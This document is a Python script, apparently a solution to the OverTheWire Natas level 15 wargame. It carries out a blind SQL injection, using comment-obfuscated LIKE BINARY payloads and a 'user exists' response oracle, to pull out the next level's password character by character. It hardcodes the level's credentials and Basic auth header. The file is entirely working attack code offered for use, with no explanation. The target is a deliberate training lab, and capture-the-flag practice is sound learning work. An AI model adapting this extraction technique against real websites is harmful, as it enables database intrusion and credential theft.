import urllib.request
import re
regex = 'This user exists'
username = "natas15"
password = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"
url = 'http://natas15.natas.labs.overthewire.org/index.php?debug&username=natas16"/**/and/**/password/**/like/**/binary/**/"'
length = 32
chars = '1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'
charsInPassword = []
fullName = ['*'] * length
name = [''] * length

#Determine chars in password
print("Determining characters in password")
for char in chars:
    req = urllib.request.Request(url + '%' + char + '%', None, {'Authorization': 'Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg'})
    response = urllib.request.urlopen(req)
    responseData = str(response.read(), 'utf-8')
    regexSearch = re.search(regex, responseData)
    if regexSearch is not None and char not in charsInPassword:
        charsInPassword.append(char)
        print(charsInPassword)

#Crack password
print("Cracking password")

for i in range(length):
    for j in range(len(charsInPassword)):
        req = urllib.request.Request(url + ''.join(name) + charsInPassword[j] + '%', None, {'Authorization': 'Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg'})
        response = urllib.request.urlopen(req)
        responseData = str(response.read(), 'utf-8')
        regexSearch = re.search(regex, responseData)
        if regexSearch is not None:
            name[i] = charsInPassword[j]
            fullName[i] = charsInPassword[j]
            print(''.join(fullName))
            break


"""for i in range(length):
    for t in range(len(chars)):
        name[i] = chars[t]
        fullName[i] = chars[t]
        print(''.join(name) + '%')
        req = urllib.request.Request(url + ''.join(name) + '%', None, {'Authorization': 'Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg'})
        o = urllib.request.urlopen(req)
        r = str(o.read(), 'utf-8')
        m = re.search(regex, r)
        if m is not None:
            print('index ' + str(t))
            print('char ' + chars[t])
            break
    print(''.join(name))
print(password)"""